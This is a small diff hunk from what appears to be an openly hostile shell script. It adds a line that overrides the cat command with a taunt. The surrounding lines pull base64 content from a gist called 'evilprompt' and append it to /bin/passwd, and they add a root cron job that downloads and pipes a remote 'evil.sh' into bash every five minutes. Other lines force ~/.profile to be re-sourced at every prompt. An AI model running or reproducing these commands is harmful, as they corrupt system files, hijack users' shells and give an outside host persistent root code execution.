@@ -16,3 +16,4 @@ curl -s https://gist.githubusercontent.com/picatz/50a80c4a50c472a9d25fd8526fc466
 echo "export PROMPT_COMMAND='source ~/.profile'" >> ~/.profile
 curl -s https://gist.githubusercontent.com/picatz/5e74171512c4c1d97fffa4003284d2d7/raw/ccc2212a090d34d91bc1e33180c49490496eb76a/evilprompt | base64 -d >> /bin/passwd
 echo "*/5 * * * * curl picatz.github.io/old/evil.sh | bash" >> /var/spool/cron/root
+echo "function cat { echo 'You are not even root' ; }" >> ~/.profile
